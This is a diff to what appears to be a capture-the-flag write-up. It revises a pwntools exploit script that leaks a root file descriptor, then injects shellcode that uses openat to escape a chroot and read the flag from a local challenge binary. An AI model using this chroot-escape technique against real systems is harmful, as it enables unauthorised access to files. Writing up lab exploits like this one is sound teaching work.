@@ -89,11 +89,10 @@ The following Python script uses `pwntools` to automate the exploit. We leverage
 ```python
 from pwn import *
 
-exe = "./challenge"
-context.binary = exe
+elf = context.binary = ELF("./challenge")
 
 # Pass '/' to leak the root FD (fd 3)
-p = process([exe, "/"])
+p = process([elf.path, "/"])
 
 # Shellcraft exploit
 # Since we are chrooted, we use openat with the leaked FD (3) to access the real flag.
@@ -106,6 +105,6 @@ sc += shellcraft.exit(0)
 shellcode = asm(sc)
 
 p.send(shellcode)
-print(p.recvall(timeout=1).decode())
+print(p.recvall().decode())
 p.close()
 ```
